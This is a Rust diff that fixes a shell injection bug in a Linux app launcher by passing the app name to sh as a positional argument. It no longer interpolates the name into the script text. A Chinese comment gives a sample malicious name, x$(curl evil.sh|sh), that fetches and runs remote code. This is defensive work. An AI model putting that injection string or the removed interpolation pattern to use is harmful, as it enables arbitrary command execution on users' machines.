@@ -184,8 +184,16 @@ mod lx {
         if run_cmd_bounded("gtk-launch", &[name], 3000).is_ok() {
             return Ok(format!("✓ 已启动「{name}」"));
         }
-        let safe = name.replace('"', "");
-        match run_cmd_bounded("sh", &["-c", &format!("setsid \"{safe}\" >/dev/null 2>&1 &")], 3000) {
+        // 把 name 作为**位置参数**交给 shell，而不是拼进脚本文本。
+        //
+        // 原来的写法只删掉了双引号就直接内插，但双引号里 `$(...)`、反引号、`$VAR` 全都
+        // 照常展开 —— 一个叫 `x$(curl evil.sh|sh)` 的"应用名"就是任意命令执行。而这个名字
+        // 是模型可控的。用 `$1` 引用时 shell 只把它当数据，不再解析其内容。
+        match run_cmd_bounded(
+            "sh",
+            &["-c", "setsid \"$1\" >/dev/null 2>&1 &", "sh", name],
+            3000,
+        ) {
             Ok(_) => Ok(format!("✓ 已尝试启动「{name}」（没出来就确认可执行名/桌面ID，或装 wmctrl 以激活已开窗口）")),
             Err(e) => Err(format!("打不开「{name}」：{e}。Linux 桌面控制需要 wmctrl+xdotool：sudo apt install wmctrl xdotool")),
         }
